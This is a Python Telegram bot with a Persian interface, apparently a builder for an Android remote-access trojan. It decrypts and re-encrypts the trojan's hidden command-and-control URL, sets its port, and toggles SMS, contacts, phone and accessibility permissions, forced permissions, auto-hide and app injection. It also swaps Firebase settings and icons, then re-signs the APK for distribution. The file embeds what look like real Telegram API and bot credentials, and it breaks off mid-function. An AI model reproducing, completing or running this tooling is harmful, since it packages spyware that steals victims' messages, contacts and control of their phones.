import os
import sys
import json
import re
import random
import shutil
import struct
import zipfile
import zlib
import hashlib
import hmac
import base64
import subprocess
import traceback
import asyncio
from telethon import TelegramClient, events
from telethon.tl.custom import Button

API_ID = 27272499
API_HASH = "9ac173237799de5eecb701853fb0a1d2"
BOT_TOKEN = "9025933970:AAGfaozZ_ee-fT3EOWGU1ObG70GuiAbd2qM"
ADMIN_ID = 6801691937

BASE = os.path.dirname(os.path.abspath(__file__))
KEYS = os.path.join(BASE, "keys")
KS = os.path.join(KEYS, "release.jks")
KP = os.path.join(KEYS, "kilid.txt")
WORK = os.path.join(BASE, "work")
ZIPALIGN = "zipalign"
APKSIGNER = "apksigner"
AAPT2 = "aapt2"
KEYTOOL = "keytool"

MG = b"3141592653589793271828182845904516180339887498951414213562373095X9#mK$2vL@8qR!5wNZ1!yU*8xW@5sQ#7nM&2kH$9fE^3cA"
PRIMS = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131]

ASSET_FILES = ["receive.json", "port.json", "permission.json", "offmod.json", "auto_hide.json", "placeholder.json", "webview.json", "app_injection.json"]
FV = ["project_id", "gcm_defaultSenderId", "google_app_id", "google_api_key", "google_storage_bucket"]
FVN = {"project_id": "پروجکت ایدی", "gcm_defaultSenderId": "سندر ایدی", "google_app_id": "اپ ایدی", "google_api_key": "ای پی ای کی", "google_storage_bucket": "باکت"}

CFG = {}
STATE = {}
SRC = {}
PKG = {}
NAME = {}

def run(c):
    return subprocess.run(c, capture_output=True, text=True)

def h32(i):
    return struct.pack(">I", i & 0xFFFFFFFF)

def b64e(b):
    return base64.b64encode(b).decode()

def b64d(s):
    return base64.b64decode(s.replace("-", "+").replace("_", "/"))

def hm256(k, d):
    return hmac.new(k, d, hashlib.sha256).digest()

def hm512(k, d):
    return hmac.new(k, d, hashlib.sha512).digest()

def kilad_biavar(lb, sm, ms):
    a = hm256(ms, sm)
    b = hm512(ms, a)[:32]
    x = lb.encode() + b"\x01" + b
    return hm256(a, x)[:32]

SBOX = bytes.fromhex(
    "637c777bf26b6fc53001672bfed7ab76"
    "ca82c97dfa5947f0add4a2af9ca472c0"
    "b7fd9326363ff7cc34a5e5f171d83115"
    "04c723c31896059a071280e2eb27b275"
    "09832c1a1b6e5aa0523bd6b329e32f84"
    "53d100ed20fcb15b6acbbe394a4c58cf"
    "d0efaafb434d338545f9027f503c9fa8"
    "51a3408f929d38f5bcb6da2110fff3d2"
    "cd0c13ec5f974417c4a77e3d645d1973"
    "60814fdc222a908846eeb814de5e0bdb"
    "e0323a0a4906245cc2d3ac629195e479"
    "e7c8376d8dd54ea96c56f4ea657aae08"
    "ba78252e1ca6b4c6e8dd741f4bbd8b8a"
    "703eb5664803f60e613557b986c11d9e"
    "e1f8981169d98e949b1e87e9ce5528df"
    "8ca1890dbfe6426841992d0fb054bb16")
RCON = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d]

def xt(a):
    a <<= 1
    if a & 0x100:
        a = (a ^ 0x11b) & 0xff
    return a

def mul(a, b):
    r = 0
    for _ in range(8):
        if b & 1:
            r ^= a
        a = xt(a)
        b >>= 1
    return r

def aes_expand(key):
    nk = len(key) // 4
    nr = nk + 6
    w = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    for i in range(nk, 4 * (nr + 1)):
        t = list(w[i - 1])
        if i % nk == 0:
            t = t[1:] + t[:1]
            t = [SBOX[x] for x in t]
            t[0] ^= RCON[i // nk]
        elif nk > 6 and i % nk == 4:
            t = [SBOX[x] for x in t]
        w.append([w[i - nk][j] ^ t[j] for j in range(4)])
    return w, nr

def aes_block(block, w, nr):
    s = list(block)
    for c in range(4):
        for r in range(4):
            s[4 * c + r] ^= w[c][r]
    for rnd in range(1, nr + 1):
        for i in range(16):
            s[i] = SBOX[s[i]]
        ns = list(s)
        for c in range(4):
            for r in range(4):
                ns[4 * c + r] = s[4 * ((c + r) % 4) + r]
        s = ns
        if rnd != nr:
            for c in range(4):
                a0, a1, a2, a3 = s[4 * c:4 * c + 4]
                s[4 * c + 0] = mul(a0, 2) ^ mul(a1, 3) ^ a2 ^ a3
                s[4 * c + 1] = a0 ^ mul(a1, 2) ^ mul(a2, 3) ^ a3
                s[4 * c + 2] = a0 ^ a1 ^ mul(a2, 2) ^ mul(a3, 3)
                s[4 * c + 3] = mul(a0, 3) ^ a1 ^ a2 ^ mul(a3, 2)
        for c in range(4):
            for r in range(4):
                s[4 * c + r] ^= w[4 * rnd + c][r]
    return bytes(s)

def aes_ctr(d, k, iv):
    w, nr = aes_expand(k)
    ctr = int.from_bytes(iv, "big")
    out = bytearray()
    for i in range(0, len(d), 16):
        ks = aes_block(ctr.to_bytes(16, "big"), w, nr)
        part = d[i:i + 16]
        out += bytes(a ^ b for a, b in zip(part, ks))
        ctr = (ctr + 1) & ((1 << 128) - 1)
    return bytes(out)

def ctr(d, k, iv):
    return aes_ctr(d, k, iv[:12] + b"\x00" * 4)

def jadval(sm, ms):
    kk = sm + ms
    h = hm512(kk, b"sbox")
    fw = list(range(256))
    i = 255
    while i > 0:
        j = ((h[i % 64] ^ h[(i * 13) % 64]) + h[(i * 7) % 64] + i) % (i + 1)
        fw[i], fw[j] = fw[j], fw[i]
        i -= 1
    iv = [0] * 256
    for x in range(256):
        iv[fw[x]] = x
    return fw, iv

def jahel(n, sm, ms):
    a = hm256(sm + ms, b"layer-seed")
    pp = []
    s = n - 1
    i = 0
    while s > 0:
        i += 1
        a2 = hm256(a, h32(i))
        j = (int.from_bytes(a2[:4], "big") & 0x7FFFFFFF) % (s + 1)
        pp.append((s, j))
        s -= 1
    return pp

def jaran(d, sm, ms):
    a = hm256(sm + ms, b"layer-seed")
    o = bytearray(d)
    ps = 0
    i = 0
    n = len(d)
    while ps < n:
        i += 1
        bf = h32(i)
        e3 = hm256(a, bf)
        e4 = hm256(a, bf + b"X")
        kb = bytes(a ^ b for a, b in zip(e3, e4))
        tk = min(len(kb), n - ps)
        for k in range(tk):
            o[ps + k] ^= kb[k]
        ps += tk
    return bytes(o)

def kilad():
    a = bytes([x % 256 for x in PRIMS])
    t = a + MG
    d1 = hashlib.sha512(t).digest()
    d2 = hashlib.sha512(d1 + t[::-1]).digest()
    m = bytes(x ^ y for x, y in zip(d1, d2))
    i = 1
    while i <= 5:
        m = hashlib.sha512(m + h32(i)).digest()
        i += 1
    return m

def ramz_gosha(s, ms):
    pp = s.split(".")
    if len(pp) != 6 or pp[0] != "v1":
        raise ValueError("bad v1")
    sm = b64d(pp[1])
    ab1 = b64d(pp[2])
    ab2 = b64d(pp[3])
    hd = json.loads(b64d(pp[4]))
    ct = b64d(pp[5])
    if hashlib.sha256(sm + ms).digest()[:8].hex() != hd.get("sch", ""):
        raise ValueError("scheme fail")
    k1 = kilad_biavar("enc-key-1", sm, ms)
    k2 = kilad_biavar("enc-key-2", sm, ms)
    l5 = ctr(ct, k2, ab2)
    l5 = ctr(l5, k1, ab1)
    ls = l5.decode()
    sg = ls.split(":")
    if len(sg) != 2:
        raise ValueError("bad layer5")
    s3 = b64d(sg[0]).decode()
    cj = json.loads(b64d(sg[1]))
    if hm256(ms + sm, s3.encode())[:16].hex() != cj.get("chk", ""):
        raise ValueError("chk fail")
    b = bytes.fromhex(s3)
    _, iv = jadval(sm, ms)
    b = bytes(iv[x] for x in b)
    pp = jahel(len(b), sm, ms)
    ls = list(b)
    for sz, j in reversed(pp):
        ls[sz], ls[j] = ls[j], ls[sz]
    b = jaran(bytes(ls), sm, ms)
    b = b[::-1]
    return zlib.decompress(b, -15).decode()

def ramz_kon(s, ms):
    sm = os.urandom(32)
    ab1 = os.urandom(12)
    ab2 = os.urandom(12)
    d = zlib.compress(s.encode(), 9)[2:-4]
    d = d[::-1]
    d = jaran(d, sm, ms)
    fw, _ = jadval(sm, ms)
    ls = [fw[x] for x in d]
    pp = jahel(len(ls), sm, ms)
    ar = list(ls)
    for sz, j in pp:
        ar[sz], ar[j] = ar[j], ar[sz]
    b = bytes(ar)
    s3 = b.hex()
    ck = hm256(ms + sm, s3.encode())[:16].hex()
    k1 = kilad_biavar("enc-key-1", sm, ms)
    k2 = kilad_biavar("enc-key-2", sm, ms)
    cj = json.dumps({"chk": ck}, separators=(",", ":"))
    l5 = (b64e(s3.encode()) + ":" + b64e(cj.encode())).encode()
    ct = ctr(l5, k1, ab1)
    ct = ctr(ct, k2, ab2)
    sc = hashlib.sha256(sm + ms).digest()[:8].hex()
    hj = json.dumps({"v": "v1", "sch": sc}, separators=(",", ":"))
    hd = b64e(hj.encode())
    return "v1." + b64e(sm) + "." + b64e(ab1) + "." + b64e(ab2) + "." + hd + "." + b64e(ct)

def raw_data(blob, info):
    off = info.header_offset
    sg, vr, fl, cm, mt, md, cr, cs, us, nl, el = struct.unpack_from("<IHHHHHIIIHH", blob, off)
    st = off + 30 + nl + el
    cd = blob[st:st + cs]
    return zlib.decompress(cd, -15) if cm == 8 else cd

def u16(b, o):
    return struct.unpack_from("<H", b, o)[0]

def u32(b, o):
    return struct.unpack_from("<I", b, o)[0]

ARSC_KEYS = ["google_app_id", "gcm_defaultSenderId", "google_api_key", "project_id",
             "google_storage_bucket", "google_crash_reporting_api_key", "firebase_database_url",
             "default_web_client_id"]

def pool_read(b, o):
    if u16(b, o) != 0x0001:
        raise ValueError("string pool nist")
    hsize = u16(b, o + 2)
    size = u32(b, o + 4)
    cnt = u32(b, o + 8)
    styc = u32(b, o + 12)
    flags = u32(b, o + 16)
    sstart = u32(b, o + 20)
    stystart = u32(b, o + 24)
    utf8 = bool(flags & 0x100)
    offs = list(struct.unpack_from("<" + str(cnt) + "I", b, o + hsize))
    strs = []
    for x in offs:
        p = o + sstart + x
        if utf8:
            n1 = b[p]
            if n1 & 0x80:
                n1 = ((n1 & 0x7F) << 8) | b[p + 1]
                p += 2
            else:
                p += 1
            n2 = b[p]
            if n2 & 0x80:
                n2 = ((n2 & 0x7F) << 8) | b[p + 1]
                p += 2
            else:
                p += 1
            strs.append(b[p:p + n2].decode("utf-8", "replace"))
        else:
            n = u16(b, p)
            if n & 0x8000:
                n = ((n & 0x7FFF) << 16) | u16(b, p + 2)
                p += 4
            else:
                p += 2
            strs.append(b[p:p + n * 2].decode("utf-16-le", "replace"))
    styles = []
    if styc:
        for x in struct.unpack_from("<" + str(styc) + "I", b, o + hsize + 4 * cnt):
            styles.append(x)
        sdata = b[o + stystart:o + size]
    else:
        sdata = b""
    return strs, utf8, size, styles, sdata

def pool_write(strs, utf8, styles, sdata):
    body = bytearray()
    offs = []
    for s in strs:
        offs.append(len(body))
        if utf8:
            bs = s.encode("utf-8")
            nc = len(bs.decode("utf-8")) if False else len(s.encode("utf-16-le")) // 2
            nb = len(bs)
            if nc > 0x7F:
                body += bytes([((nc >> 8) & 0xFF) | 0x80, nc & 0xFF])
            else:
                body.append(nc)
            if nb > 0x7F:
                body += bytes([((nb >> 8) & 0xFF) | 0x80, nb & 0xFF])
            else:
                body.append(nb)
            body += bs + b"\x00"
        else:
            cs = s.encode("utf-16-le")
            n = len(cs) // 2
            if n > 0x7FFF:
                body += struct.pack("<HH", (n >> 16) | 0x8000, n & 0xFFFF)
            else:
                body += struct.pack("<H", n)
            body += cs + b"\x00\x00"
    while len(body) % 4:
        body.append(0)
    hsize = 28
    sstart = hsize + 4 * len(strs) + 4 * len(styles)
    size = sstart + len(body) + len(sdata)
    flags = 0x100 if utf8 else 0
    head = struct.pack("<HHIIIIII", 0x0001, hsize, size, len(strs), len(styles), flags, sstart, sstart + len(body) if styles else 0)
    out = head + b"".join(struct.pack("<I", x) for x in offs)
    out += b"".join(struct.pack("<I", x) for x in styles)
    out += bytes(body) + sdata
    return out

def arsc_scan(b):
    hsz = u16(b, 2)
    gstr, gu8, gsize, gsty, gsdata = pool_read(b, hsz)
    found = {}
    p = hsz + gsize
    n = len(b)
    while p + 8 <= n:
        typ = u16(b, p)
        csz = u32(b, p + 4)
        if csz < 8 or p + csz > n:
            break
        if typ == 0x0200:
            phsz = u16(b, p + 2)
            koff = u32(b, p + 276)
            try:
                kstr, _, _, _, _ = pool_read(b, p + koff)
            except Exception:
                kstr = []
            q = p + phsz
            end = p + csz
            while q + 8 <= end:
                t2 = u16(b, q)
                c2 = u32(b, q + 4)
                if c2 < 8 or q + c2 > end:
                    break
                if t2 == 0x0201:
                    tsz = u16(b, q + 2)
                    cnt = u32(b, q + 12)
                    est = u32(b, q + 16)
                    for i in range(cnt):
                        eo = u32(b, q + tsz + 4 * i)
                        if eo == 0xFFFFFFFF:
                            continue
                        e = q + est + eo
                        if e + 8 > end:
                            break
                        esz = u16(b, e)
                        efl = u16(b, e + 2)
                        if efl & 0x0001:
                            continue
                        ki = u32(b, e + 4)
                        if ki >= len(kstr):
                            continue
                        nm = kstr[ki]
                        if nm not in ARSC_KEYS:
                            continue
                        v = e + esz
                        if v + 8 > end:
                            continue
                        dt = b[v + 3]
                        dv = u32(b, v + 4)
                        if dt == 0x03 and dv < len(gstr):
                            found.setdefault(nm, set()).add(dv)
                q += c2
        p += csz
    return gstr, gu8, gsize, gsty, gsdata, found

def arsc_patch(b, fb):
    gstr, gu8, gsize, gsty, gsdata, found = arsc_scan(b)
    ch = 0
    for k, v in (fb or {}).items():
        if k not in found or v is None:
            v = str(v if v is not None else "")
        if k not in found or str(v) == "":
            continue
        for i in sorted(found[k]):
            if gstr[i] != str(v):
                gstr[i] = str(v)
                ch += 1
    if not ch:
        return b, {}
    new = pool_write(gstr, gu8, gsty, gsdata)
    hsz = u16(b, 2)
    out = bytearray(b[:hsz] + new + b[hsz + gsize:])
    struct.pack_into("<I", out, 4, len(out))
    res = {}
    for k in found:
        for i in sorted(found[k]):
            res[k] = gstr[i]
    return bytes(out), res

def arsc_check(b):
    gstr, _, _, _, _, found = arsc_scan(b)
    out = {}
    for k, ids in found.items():
        for i in sorted(ids):
            out[k] = gstr[i]
    return out

def fb_from_gsj(path):
    d = json.load(open(path, encoding="utf-8"))
    pi = d.get("project_info") or {}
    cl = (d.get("client") or [{}])[0]
    key = ""
    try:
        key = (cl.get("api_key") or [{}])[0].get("current_key", "")
    except Exception:
        key = ""
    app_id = ((cl.get("client_info") or {}).get("mobilesdk_app_id") or "")
    out = {
        "google_app_id": app_id,
        "gcm_defaultSenderId": str(pi.get("project_number", "")),
        "google_api_key": key,
        "project_id": str(pi.get("project_id", "")),
        "google_storage_bucket": str(pi.get("storage_bucket", "")),
        "google_crash_reporting_api_key": key,
    }
    if pi.get("firebase_url"):
        out["firebase_database_url"] = pi["firebase_url"]
    return {k: v for k, v in out.items() if v}

def sig_name(nm):
    return bool(re.fullmatch(r"META-INF/[^/]+\.(RSA|DSA|EC|SF|MF)", nm))

def apk_read(apk, name):
    z = zipfile.ZipFile(apk)
    try:
        return z.read(name)
    except RuntimeError:
        return raw_data(open(apk, "rb").read(), z.getinfo(name))
    finally:
        z.close()

def read_assets(apk):
    d = {}
    z = zipfile.ZipFile(apk)
    blob = None
    for nm in ASSET_FILES:
        p = "assets/" + nm
        if p not in z.namelist():
            continue
        try:
            d[nm.replace(".json", "")] = json.loads(z.read(p))
        except RuntimeError:
            if blob is None:
                blob = open(apk, "rb").read()
            try:
                d[nm.replace(".json", "")] = json.loads(raw_data(blob, z.getinfo(p)))
            except Exception:
                pass
        except Exception:
            pass
    z.close()
    return d

def badging(apk):
    pkg = ""
    lbl = ""
    r = run([AAPT2, "dump", "badging", apk])
    for ln in r.stdout.splitlines():
        if ln.startswith("package:"):
            m = re.search(r"name='([^']+)'", ln)
            if m:
                pkg = m.group(1)
        elif ln.startswith("application-label:"):
            lbl = ln.split(":", 1)[1].strip().strip("'")
    return pkg, lbl

def fb_strings(apk):
    out = {}
    r = run([AAPT2, "dump", "resources", apk])
    lines = r.stdout.splitlines()
    for i, ln in enumerate(lines):
        m = re.search(r"string/([A-Za-z0-9_]+)\s", ln)
        if not m or m.group(1) not in FV:
            continue
        for j in range(i + 1, min(i + 4, len(lines))):
            mm = re.search(r'"([^"]*)"', lines[j])
            if mm:
                out[m.group(1)] = mm.group(1)
                break
    return out

def load(apk):
    ms = kilad()
    a = read_assets(apk)
    c = {}
    c["rat_url"] = ""
    try:
        c["rat_url"] = ramz_gosha(a.get("receive", {}).get("receive", ""), ms)
    except Exception:
        pass
    c["port"] = ""
    try:
        c["port"] = a.get("port", {}).get("port", "")
    except Exception:
        pass
    p = a.get("permission", {}) or {}
    c["permissions"] = {"phone": p.get("phone", "on"), "sms": p.get("sms", "on"), "contacts": p.get("contacts", "on"), "storage": p.get("storage", "on"), "accessibility": p.get("Accessibility", "off"), "notification": p.get("notification", "on"), "force": p.get("perm_force", "on")}
    o = a.get("offmod", {}) or {}
    c["off_mod"] = {"off_mod": o.get("off_mod", ""), "slot": o.get("slot", 1)}
    c["auto_hide"] = (a.get("auto_hide", {}) or {}).get("auto_hide", "off")
    try:
        c["placeholder_sizemb"] = float((a.get("placeholder", {}) or {}).get("sizemb", 15))
    except Exception:
        c["placeholder_sizemb"] = 15
    c["webview"] = (a.get("webview", {}) or {}).get("webview_url", "")
    c["app_injection"] = (a.get("app_injection", {}) or {}).get("app_injection", "off")
    try:
        c["firebase"] = arsc_check(apk_read(apk, "resources.arsc"))
    except Exception:
        c["firebase"] = fb_strings(apk)
    for k in FV:
        c["firebase"].setdefault(k, "")
    c["fb_changed"] = False
    pkg, lbl = badging(apk)
    c["app_name"] = lbl
    c["icon"] = None
    return c, pkg

def patched(c, ms):
    p = {}
    p["assets/receive.json"] = json.dumps({"receive": ramz_kon(c["rat_url"], ms)}).encode()
    p["assets/port.json"] = json.dumps({"port": c["port"]}).encode()
    p["assets/permission.json"] = json.dumps({"phone": c["permissions"].get("phone", "on"), "sms": c["permissions"].get("sms", "on"), "contacts": c["permissions"].get("contacts", "on"), "storage": c["permissions"].get("storage", "on"), "Accessibility": c["permissions"].get("accessibility", "off"), "notification": c["permissions"].get("notification", "on"), "perm_force": c["permissions"].get("force", "on")}, indent=2).encode()
    p["assets/offmod.json"] = json.dumps(c["off_mod"], indent=2).encode()
    p["assets/auto_hide.json"] = json.dumps({"auto_hide": c["auto_hide"]}).encode()
    p["assets/placeholder.json"] = json.dumps({"sizemb": float(c["placeholder_sizemb"])}).encode()
    p["assets/webview.json"] = json.dumps({"webview_url": c["webview"]}).encode()
    p["assets/app_injection.json"] = json.dumps({"app_injection": c["app_injection"]}).encode()
    return p

def fb_patch_apk(c, pat, src):
    fb = {k: str(v) for k, v in (c.get("firebase") or {}).items() if str(v or "") != ""}
    if "google_api_key" in fb:
        fb["google_crash_reporting_api_key"] = fb["google_api_key"]
    if not fb:
        return
    raw = apk_read(src, "resources.arsc")
    new, got = arsc_patch(raw, fb)
    if new == raw:
        if c.get("fb_changed"):
            raise RuntimeError("فایربیس داخل apk عوض نشد")
        return
    pat["resources.arsc"] = new
    c["fb_applied"] = got

def kilid_kar():
    os.makedirs(KEYS, exist_ok=True)
    if os.path.exists(KS) and os.path.exists(KP):
        return open(KP, encoding="utf-8").read().strip()
    pw = "".join(random.choices("abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789", k=24))
    r = run([KEYTOOL, "-genkeypair", "-v", "-keystore", KS, "-alias", "meta", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storetype", "PKCS12", "-storepass", pw, "-keypass", pw, "-dname", "CN=Android"])
    if r.returncode != 0 or not os.path.exists(KS):
        raise RuntimeError("ساخت کلید نشد")
    open(KP, "w", encoding="utf-8").write(pw)
    try:
        open(os.path.join(KEYS, ".yeni"), "w", encoding="utf-8").write("1")
    except Exception:
        pass
    return pw

def imza_kod():
    try:
        pw = open(KP, encoding="utf-8").read().strip()
        r = run([KEYTOOL, "-list", "-v", "-keystore", KS, "-storepass", pw, "-alias", "meta"])
        m = re.search(r"SHA256:\s*([0-9A-F:]{95})", r.stdout)
        if m:
            return m.group(1).replace(":", "")[:16].lower()
    except Exception:
        pass
    return ""

def link_dorost(v):
    v = v.strip()
    if not v.lower().startswith(("http://", "https://")):
        v = "https://" + v
    v = v.rstrip("/")
    if not v.lower().endswith(".php"):
        v = v + "/receiver.php"
    return v

def pak_name(uid):
    b = os.path.splitext(os.path.basename(NAME.get(uid) or "rat.apk"))[0]
    b = re.sub(r"[^A-Za-z0-9._-]+", "_", b).strip("._-") or "rat"
    return b + "-edited-" + "".join(random.choices("0123456789abcdef", k=6)) + ".apk"

def align_zip(raw, out):
    src = zipfile.ZipFile(raw)
    cd = []
    with open(out, "wb") as f:
        for info in src.infolist():
            name = info.filename.encode("utf-8")
            data = src.read(info.filename)
            if info.compress_type == zipfile.ZIP_DEFLATED:
                co = zlib.compressobj(9, zlib.DEFLATED, -15)
                blob = co.compress(data) + co.flush()
                method = 8
            else:
                blob = data
                method = 0
            crc = zlib.crc32(data) & 0xFFFFFFFF
            al = 4
            if method == 0:
                if name.endswith(b".so"):
                    al = 16384
                elif name == b"resources.arsc":
                    al = 4096
            pos = f.tell()
            base = pos + 30 + len(name)
            pad = (-base) % al
            if pad < 4:
                pad += al
            dlen = pad - 4
            extra = struct.pack("<HH", 0xD935, dlen) + b"\x00" * dlen
            y, mo, d, h, mi, s = info.date_time
            dtime = (h << 11) | (mi << 5) | (s // 2)
            ddate = ((y - 1980) << 9) | (mo << 5) | d
            flags = info.flag_bits & 0x800
            f.write(struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, flags, method, dtime, ddate, crc, len(blob), len(data), len(name), len(extra)))
            f.write(name)
            f.write(extra)
            f.write(blob)
            cd.append((name, method, dtime, ddate, crc, len(blob), len(data), extra, pos, flags, info.external_attr))
        cd_off = f.tell()
        for (name, method, dtime, ddate, crc, csize, usize, extra, off, flags, attr) in cd:
            f.write(struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, flags, method, dtime, ddate, crc, csize, usize, len(name), len(extra), 0, 0, 0, attr, off))
            f.write(name)
            f.write(extra)
        cd_size = f.tell() - cd_off
        f.write(struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, len(cd), len(cd), cd_size, cd_off, 0))
    src.close()

def build(uid):
    c = CFG[uid]
    src = SRC[uid]
    d = os.path.join(WORK, str(uid))
    os.makedirs(d, exist_ok=True)
    ms = kilad()
    pat = patched(c, ms)
    fb_patch_apk(c, pat, src)
    icon = c.get("icon")
    raw = os.path.join(d, "raw.apk")
    al = os.path.join(d, "al.apk")
    out = os.path.join(d, pak_name(uid))
    for f in (raw, al, out):
        if os.path.exists(f):
            os.remove(f)
    for f in os.listdir(d):
        if "-edited-" in f:
            try:
                os.remove(os.path.join(d, f))
            except Exception:
                pass
    blob = open(src, "rb").read()
    zi = zipfile.ZipFile(src)
    zo = zipfile.ZipFile(raw, "w", zipfile.ZIP_DEFLATED, allowZip64=True)
    for info in zi.infolist():
        nm = info.filename
        if sig_name(nm):
            continue
        if nm in pat:
            data = pat[nm]
        elif icon and nm.endswith("/logo.png"):
            data = open(icon, "rb").read()
        elif info.flag_bits & 1:
            data = raw_data(blob, info)
        else:
            data = zi.read(nm)
        z = zipfile.ZipInfo(nm, date_time=(1980, 1, 1, 0, 0, 0))
        z.compress_type = info.compress_type
        z.external_attr = info.external_attr
        z.create_system = 0
        zo.writestr(z, data)
    zo.close()
    zi.close()
    align_zip(raw, al)
    ksp = kilid_kar()
    r = run([APKSIGNER, "sign", "--ks", KS, "--ks-pass", "pass:" + ksp, "--key-pass", "pass:" + ksp, "--ks-key-alias", "meta", "--out", out, al])
    if r.returncode != 0:
        raise RuntimeError("امضا نشد\n" + (r.stderr or r.stdout)[-300:])
    ok = run([APKSIGNER, "verify", "--print-certs", out]).returncode == 0
    try:
        c["fb_readback"] = arsc_check(apk_read(out, "resources.arsc"))
    except Exception:
        c["fb_readback"] = {}
    chk = ""
    try:
        chk = ramz_gosha(json.loads(apk_read(out, "assets/receive.json"))["receive"], ms)
    except Exception:
        chk = "ناخونده"
    for f in (raw, al, out + ".idsig"):
        if os.path.exists(f):
            try:
                os.remove(f)
            except Exception:
                pass
    return out, ok, chk

def status_text(uid):
    c = CFG[uid]
    p = c.get("permissions", {})
    fb = c.get("firebase", {})
    ln = []
    ln.append("اسم برنامه " + str(c.get("app_name", "")))
    ln.append("پکیج نیم " + str(PKG.get(uid, "")))
    ln.append("لینک رت " + str(c.get("rat_url", "")))
    ln.append("پورت " + str(c.get("port", "")))
    k = imza_kod()
    if k:
        ln.append("امضا " + k)
    if os.path.exists(os.path.join(KEYS, ".yeni")):
        ln.append("هشدار: کلید امضا تازه ساخته شد، apk قبلی روی گوشی آپدیت نمیشه")
    ln.append("")
    ln.append("دسترسی ها")
    ln.append("تلفن " + ("روشن" if p.get("phone") == "on" else "خاموش"))
    ln.append("پیامک " + ("روشن" if p.get("sms") == "on" else "خاموش"))
    ln.append("مخاطبین " + ("روشن" if p.get("contacts") == "on" else "خاموش"))
    ln.append("حافظه " + ("روشن" if p.get("storage") == "on" else "خاموش"))
    ln.append("دسترسی پذیری " + ("روشن" if p.get("accessibility") == "on" else "خاموش"))
    ln.append("نوتیفیکیشن " + ("روشن" if p.get("notification") == "on" else "خاموش"))
    ln.append("اجبار " + ("روشن" if p.get("force") == "on" else "خاموش"))
    ln.append("")
    ln.append("تنظیمات")
    ln.append("اف مود " + str(c.get("off_mod", {}).get("off_mod", "")))
    ln.append("اسلات " + str(c.get("off_mod", {}).get("slot", 1)))
    ln.append("مخفی سازی " + str(c.get("auto_hide", "off")))
    ln.append("حجم پلیس هولدر " + str(c.get("placeholder_sizemb", 15)))
    ln.append("وب ویو " + str(c.get("webview", "")))
    ln.append("اپ اینجکشن " + str(c.get("app_injection", "off")))
    ln.append("")
    ln.append("فایربیس")
    for k in FV:
        if fb.get(k):
            ln.append(FVN[k] + " " + str(fb[k]))
    return "\n".join(ln)

def main_kb():
    return [
        [Button.inline("لینک رت", b"e:rat_url"), Button.inline("پورت", b"e:port")],
        [Button.inline("دسترسی ها", b"m:perm"), Button.inline("تنظیمات بیشتر", b"m:more")],
        [Button.inline("ایکون", b"e:icon"), Button.inline("فایربیس", b"m:fb")],
        [Button.inline("بساز", b"go")],
    ]

def firebase_kb(uid):
    fb = CFG[uid].get("firebase", {})
    rows = []
    for k in FV:
        v = str(fb.get(k, "") or "")
        if v:
            t = FVN[k] + ": " + (v[:22] + "..." if len(v) > 22 else v)
        else:
            t = FVN[k] + ": خالی"
        rows.append([Button.inline(t, ("f:" + k).encode())])
    rows.append([Button.inline("از google-services.json", b"f:json")])
    rows.append([Button.inline("بازگشت", b"m:main")])
    return rows

def perm_kb(uid):
    p = CFG[uid].get("permissions", {})
    def b(k, t):
        return Button.inline(t + (" روشن" if p.get(k) == "on" else " خاموش"), ("p:" + k).encode())
    return [
        [b("phone", "تلفن"), b("sms", "پیامک")],
        [b("contacts", "مخاطبین"), b("storage", "حافظه")],
        [b("accessibility", "دسترسی پذیری"), b("notification", "نوتیفیکیشن")],
        [b("force", "اجبار"), Button.inline("بازگشت", b"m:main")],
    ]

def more_kb(uid):
    c = CFG[uid]
    return [
        [Button.inline("اف مود", b"e:off_mod"), Button.inline("اسلات", b"e:slot")],
        [Button.inline("مخفی سازی " + str(c.get("auto_hide", "off")), b"t:auto_hide")],
        [Button.inline("حجم پلیس هولدر", b"e:placeholder"), Button.inline("وب ویو", b"e:webview")],
        [Button.inline("اپ اینجکشن " + str(c.get("app_injection", "off")), b"t:app_injection")],
        [Button.inline("بازگشت", b"m:main")],
    ]

def need_tools():
    gh = []
    for t in (APKSIGNER, AAPT2, KEYTOOL):
        if shutil.which(t) is None:
            gh.append(t)
    return gh

client = None

def make_client():
    return TelegramClient(os.path.join(BASE, "bot_session_" + BOT_TOKEN.split(":")[0]), API_ID, API_HASH)

async def show(uid, ev=None):
    txt = status_text(uid)
    if ev is not None:
        try:
            await ev.edit(txt, buttons=main_kb())
            return
        except Exception:
            pass
    await client.send_message(uid, txt, buttons=main_kb())

async def on_msg(ev):
    uid = ev.sender_id
    if uid != ADMIN_ID or not ev.is_private:
        return
    if ev.text and ev.text.strip() == "/start":
        STATE[uid] = None
        await ev.respond("سلام\nرت رو بفرست")
        return
    if ev.document is not None and STATE.get(uid) == ("fbjson", None):
        d = os.path.join(WORK, str(uid))
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, "gs.json")
        if os.path.exists(p):
            os.remove(p)
        await ev.respond("دارم میگیرم")
        await ev.download_media(file=p)
        try:
            vals = fb_from_gsj(p)
        except Exception as e:
            STATE[uid] = None
            await ev.respond("خوندنش نشد\n" + str(e))
            return
        if not vals:
            STATE[uid] = None
            await ev.respond("چیزی داخلش نبود")
            return
        CFG[uid].setdefault("firebase", {}).update(vals)
        CFG[uid]["fb_changed"] = True
        STATE[uid] = None
        msg = "فایربیس از فایل ست شد\n" + "\n".join(FVN.get(k, k) + " " + str(v) for k, v in vals.items() if k in FV)
        try:
            g = json.load(open(p, encoding="utf-8"))
            pn = (((g.get("client") or [{}])[0].get("client_info") or {}).get("android_client_info") or {}).get("package_name", "")
        except Exception:
            pn = ""
        if pn and PKG.get(uid) and pn != PKG.get(uid):
            msg += "\n\nهشدار\nپکیج داخل فایل " + str(pn) + " با پکیج رت " + str(PKG.get(uid)) + " یکی نیست\nفایربیس احتمالا کار نمیکنه"
        await ev.respond(msg)
        await show(uid)
        return
    if ev.document is not None:
        d = os.path.join(WORK, str(uid))
        os.makedirs(d, exist_ok=True)
        apk = os.path.join(d, "src.apk")
        try:
            NAME[uid] = ev.file.name or "rat.apk"
        except Exception:
